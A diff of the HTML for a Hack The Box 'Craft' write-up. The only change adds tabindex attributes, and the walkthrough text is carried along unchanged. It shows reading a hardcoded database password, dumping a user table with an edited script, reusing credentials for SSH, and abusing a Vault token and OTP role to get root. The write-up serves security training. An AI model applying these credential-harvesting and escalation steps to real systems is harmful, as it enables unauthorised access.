 drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
@@ -1320,7 +1320,7 @@ craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
 dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
 /opt/app # 
 </code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
 #!/usr/bin/env python
 
 import pymysql
@@ -1350,10 +1350,10 @@ finally:
 
 
 So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
 /opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
 </code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # python dbtest.py
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # python dbtest.py
 [{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
 /opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
 /opt/app # python dbtest.py
@@ -1374,7 +1374,7 @@ So, I change the script to do a <code>show tables</code> using <code>fetchall()<
 
 
 <p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
 
 
   .   *   ..  . *  *
@@ -1409,7 +1409,7 @@ gilfoyle@craft:~$ wc -c user.txt
 33 user.txt
 </code></pre><h2 id="root">root</h2>
 <p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/">Vault project page</a>), and try to login to vault with it which goes well.</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
 Token (will be hidden): 
 Success! You are now authenticated. The token information displayed below
@@ -1432,7 +1432,7 @@ gilfoyle@craft:~$
 
 
 with this information we run vault to get the kv if the secret is indeed there:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
 ========== Data ==========
 Key                  Value
 ---                  -----
@@ -1444,7 +1444,7 @@ key_type             otp
 port                 22
 </code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password</a>)
 We check what options vault provides to use it:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
 Usage: vault &lt;command&gt; [args]
 
 Common commands:
@@ -1499,7 +1499,7 @@ Usage: vault ssh [options] username@ip [ssh options]
 
   For the full list of options and arguments, please see the documentation.
 </code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
 below. Enter this code in the SSH password prompt. If you install sshpass,
 Vault can automatically perform this step for you.
